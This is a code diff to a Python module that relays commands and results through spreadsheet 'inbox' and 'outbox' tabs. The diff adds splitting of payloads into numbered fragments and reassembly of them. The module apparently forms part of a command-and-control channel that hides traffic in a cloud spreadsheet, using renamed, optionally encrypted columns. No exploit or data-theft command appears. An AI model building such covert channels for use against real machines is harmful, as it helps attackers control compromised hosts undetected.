@@ -18,6 +18,16 @@ def load_env(path=".env"):
             os.environ[key.strip()] = val.strip()
 
 
+def get_fragmenter():
+    """Return the configured Fragmenter instance based on FRAGMENT_METHOD env var."""
+    method = os.environ.get("FRAGMENT_METHOD", "passthrough").strip().lower()
+    if method == "fixed":
+        from fragmenter.fixed import FixedFragmenter
+        return FixedFragmenter()
+    from fragmenter.passthrough import PassthroughFragmenter
+    return PassthroughFragmenter()
+
+
 def get_encryptor():
     """Return the configured Encryptor instance based on ENCRYPTION_METHOD env var."""
     method = os.environ.get("ENCRYPTION_METHOD", "plaintext").strip().lower()
@@ -82,6 +92,81 @@ def _decrypt_row(row, enc):
     return out
 
 
+def _reassemble_fragments(rows, data_field, done_status):
+    """Detect frag: rows, reassemble complete sets, pass normal rows through.
+
+    Fragment rows use status="frag:N:T" (N=index 0-based, T=total).
+    Incomplete sets are silently dropped — they will reappear next full-tab read.
+    Complete sets are returned as a single row with the full data_field value
+    and status set to done_status.
+    """
+    normal = []
+    frags = {}  # command_id -> {"total": int, "chunks": {index: chunk}, "meta": dict}
+
+    for row in rows:
+        status = row.get("status", "")
+        if status.startswith("frag:"):
+            parts = status.split(":")
+            if len(parts) != 3:
+                normal.append(row)
+                continue
+            try:
+                idx, total = int(parts[1]), int(parts[2])
+            except ValueError:
+                normal.append(row)
+                continue
+            cid = row.get("command_id", "")
+            if cid not in frags:
+                frags[cid] = {"total": total, "chunks": {}, "meta": None}
+            frags[cid]["chunks"][idx] = row.get(data_field, "")
+            if frags[cid]["meta"] is None:
+                frags[cid]["meta"] = {k: v for k, v in row.items()}
+        else:
+            normal.append(row)
+
+    for cid, frag_data in frags.items():
+        if len(frag_data["chunks"]) >= frag_data["total"]:
+            chunks = [frag_data["chunks"][i] for i in range(frag_data["total"])]
+            row = dict(frag_data["meta"])
+            row[data_field] = "".join(chunks)
+            row["status"] = done_status
+            normal.append(row)
+        # incomplete sets are silently dropped; full-tab read next cycle will retry
+
+    return normal
+
+
+def build_outbox_fragments(data, chunks):
+    """Build outbox fragment rows from a pre-fragmented list of result chunks."""
+    total = len(chunks)
+    return [
+        {
+            "command_id": data["command_id"],
+            "client_id": data.get("client_id", ""),
+            "status": f"frag:{i}:{total}",
+            "result": chunk,
+            "timestamp": data.get("timestamp", ""),
+        }
+        for i, chunk in enumerate(chunks)
+    ]
+
+
+def build_inbox_fragments(data, chunks):
+    """Build inbox fragment rows from a pre-fragmented list of payload chunks."""
+    total = len(chunks)
+    return [
+        {
+            "command_id": data["command_id"],
+            "command": data.get("command", ""),
+            "payload": chunk,
+            "target": data.get("target", ""),
+            "status": f"frag:{i}:{total}",
+            "created_at": data.get("created_at", ""),
+        }
+        for i, chunk in enumerate(chunks)
+    ]
+
+
 def sheet_url(gid):
     """Build CSV export URL for a tab."""
     sid = os.environ["SPREADSHEET_ID"]
@@ -119,7 +204,7 @@ def read_config():
 
 
 def read_inbox():
-    """Read inbox tab, translate column names, decrypt all fields, return list of task dicts."""
+    """Read inbox tab, translate column names, decrypt all fields, reassemble fragments."""
     gid = os.environ["INBOX_GID"]
     rows = read_tab(gid)
     column_map = _get_column_map("INBOX_COLUMN_MAP")
@@ -129,11 +214,11 @@ def read_inbox():
         row = _translate_row(row, column_map)
         row = _decrypt_row(row, enc)
         result.append(row)
-    return result
+    return _reassemble_fragments(result, "payload", "pending")
 
 
 def read_outbox():
-    """Read outbox tab, translate column names, decrypt all fields, return list of result dicts."""
+    """Read outbox tab, translate column names, decrypt all fields, reassemble fragments."""
     gid = os.environ["OUTBOX_GID"]
     rows = read_tab(gid)
     column_map = _get_column_map("OUTBOX_COLUMN_MAP")
@@ -143,7 +228,7 @@ def read_outbox():
         row = _translate_row(row, column_map)
         row = _decrypt_row(row, enc)
         result.append(row)
-    return result
+    return _reassemble_fragments(result, "result", "success")
 
 
 def write_form(data):
